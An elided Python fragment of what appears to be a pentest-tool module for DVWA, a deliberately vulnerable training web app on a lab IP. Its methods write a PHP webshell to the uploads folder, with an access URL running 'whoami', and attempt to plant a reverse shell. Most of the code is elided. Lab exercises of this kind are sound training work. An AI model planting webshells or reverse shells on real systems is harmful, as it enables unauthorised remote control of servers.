...
class Module:
    def __init__(self):
        ...
        self.target = "http://192.168.163.128"
        self.user = "admin"
        self.password = "password"
        self.upload_path = "/srv/dvwa/hackable/uploads"   # adjust if different
        self.session = None
    ...
    def handle_command(self, cmd_input):
        ...
        print("  run / exploit                    → interactive menu (future)")
    ...
    def upload_webshell(self):
        ...
        safe_content = webshell_content.replace('"', '\\"').replace("'", "\\'")
        ...
        print("[+] Attempted to write simple webshell")
        print(f"Access URL: {self.target}/hackable/uploads/shell.php?cmd=whoami")
        print("Verify with: ls -la " + self.upload_path)
...
?>"""
        ...
        print("[+] Attempted to write reverse shell")
